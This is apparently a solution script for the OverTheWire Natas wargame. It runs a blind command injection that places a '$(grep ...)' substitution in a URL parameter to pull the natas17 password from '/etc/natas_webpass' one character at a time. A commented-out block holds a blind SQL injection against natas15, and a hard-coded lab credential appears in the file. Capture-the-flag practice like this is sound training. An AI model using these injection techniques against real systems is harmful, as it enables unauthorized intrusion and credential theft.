import requests

params = ("natas16","WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")
chrsets = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
password = ''
filtered = 'bcdghkmnqrswAGHNPQSW035789'
while(True):
    for c in filtered:
        inject = 'apple$(grep ^'+password+c+' /etc/natas_webpass/natas17)'
        res = requests.get(
                "http://natas16.natas.labs.overthewire.org/index.php",
                auth = params,
                params = {
                    "needle":inject
                    }
                )
        if b'apple' not in res.content:
            #filtered += c
            #print(c)
            #break
            password += c
            print(c)
            break
    else:
        print(password)
        break
    #print(filtered)
'''
for n in range(1,33):
    for i in chrsets:
        username = "natas16 \" and ascii(substr(password,"+str(n)+",1))='"+str(ord(i))+"' #"
        #print(username)
        #continue
        res = requests.get(
            "http://natas15.natas.labs.overthewire.org/index.php",
            auth=params,
            params={
                "username":username
                }
            )
        if (b"user exists" in res.content):
            password += i
            print(password)
            break
print(password)
'''
